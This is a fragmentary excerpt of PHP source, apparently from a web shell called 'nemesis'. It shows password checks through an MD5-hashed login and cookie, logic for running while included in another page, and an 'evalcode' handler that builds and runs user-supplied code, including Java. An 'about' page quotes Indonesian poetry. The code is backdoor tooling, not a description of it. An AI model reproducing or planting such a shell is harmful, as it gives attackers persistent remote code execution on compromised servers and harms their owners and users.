...
if(strlen(trim($s_pass))>0){
	if(isset($_COOKIE['nemesis'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['nemesis']))) $s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$s_login = strtolower(md5(trim($_REQUEST['login'])));
		if(strtolower(trim($s_pass)) == $s_login){
			setcookie("nemesis",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_REQUEST['x']) && ($_REQUEST['x']=='logout')){
		$s_reload = (isset($_COOKIE['nemesis_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
...
$s_favicon = "https://raw.githubusercontent.com/akunanti001-cpu/mari/refs/heads/main/bug%20hunter.png";
...
if(isset($_COOKIE['nemesis_included'])){
	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("nemesis_included", "0" ,time() - $s_login_time);
	...
	if(strcmp($s_cek1,$s_cek2)!=0){
		...
		setcookie("nemesis_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
...
if($s_auth){
		...
		if(isset($_REQUEST['evalcode'])){
			...
			elseif(strtolower($s_lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
					...
					$s_rand = "nemesis_".substr(md5(time().rand(0,100)),0,8);
					$s_script = $s_rand;
	...
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='about')){
        ...
        <p>aku ingin mencintaimu dengan sederhana</p>
        <p>dengan isyarat yang tak sempat disampaikan awan kepada hujan yang menjadikannya tiada </p>
		</div>";
	}
